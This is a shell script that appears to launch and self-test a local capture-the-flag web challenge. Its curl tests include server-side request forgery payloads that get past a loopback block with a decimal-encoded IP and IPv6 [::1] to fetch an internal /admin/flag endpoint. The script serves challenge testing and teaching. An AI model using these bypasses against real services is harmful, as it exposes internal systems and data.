#!/bin/bash

echo "🧪 Testing NewsPreview CTF Challenge Locally"
echo "==========================================="

cd "$(dirname "$0")"

# Check if Node.js is installed
if ! command -v node &> /dev/null; then
    echo "❌ Node.js is not installed. Please install Node.js first."
    exit 1
fi

# Install dependencies if needed
if [ ! -d "node_modules" ]; then
    echo "📦 Installing dependencies..."
    npm install
fi

# Start internal service in background
echo "🔧 Starting internal service on port 5001..."
node internal-service.js &
INTERNAL_PID=$!

# Wait a moment for internal service to start
sleep 2

# Start main application in background
echo "🚀 Starting main application on port 3000..."
PORT=3000 node app.js &
MAIN_PID=$!

# Wait for services to be ready
sleep 3

# Function to cleanup processes
cleanup() {
    echo ""
    echo "🧹 Cleaning up..."
    kill $MAIN_PID $INTERNAL_PID 2>/dev/null
    exit
}

# Set trap to cleanup on script exit
trap cleanup EXIT INT TERM

echo ""
echo "✅ Services are running!"
echo "🌐 Access the challenge at: http://localhost:3000"
echo "🔍 Internal service at: http://127.0.0.1:5001"
echo ""

# Test the challenge
echo "🧪 Running tests..."
echo ""

echo "1. Testing legitimate request..."
sleep 1
curl -s "http://localhost:3000/preview?link=https://httpbin.org/html" | jq -r '.title // .error' 2>/dev/null || echo "Title extraction test"

echo ""
echo "2. Testing blocked request (should fail with WAF error)..."
sleep 1
curl -s "http://localhost:3000/preview?link=http://127.0.0.1:5001/admin/flag" | jq -r '.error // .message' 2>/dev/null || echo "WAF block test"

echo ""
echo "3. Testing SSRF bypass with decimal IP..."
sleep 1
RESULT=$(curl -s "http://localhost:3000/preview?link=http://2130706433:5001/admin/flag" | jq -r '.title // .flag // .error' 2>/dev/null)
echo "Result: $RESULT"

if [[ "$RESULT" == *"ACNCTF"* ]]; then
    echo "🎉 SUCCESS! Flag found: $RESULT"
else
    echo "⚠️  Expected flag, got: $RESULT"
fi

echo ""
echo "4. Testing SSRF bypass with IPv6..."
sleep 1
RESULT=$(curl -s "http://localhost:3000/preview?link=http://[::1]:5001/admin/flag" 2>/dev/null | jq -r '.title // .flag // .error' 2>/dev/null)
echo "Result: $RESULT"

if [[ "$RESULT" == *"ACNCTF"* ]]; then
    echo "🎉 SUCCESS! Flag found: $RESULT"
else
    echo "⚠️  Expected flag, got: $RESULT"
fi

echo ""
echo "🎯 Challenge is ready! Press Ctrl+C to stop the services."
echo "💡 Try accessing http://localhost:3000 in your browser"

# Keep running until interrupted
while true; do
    sleep 1
done
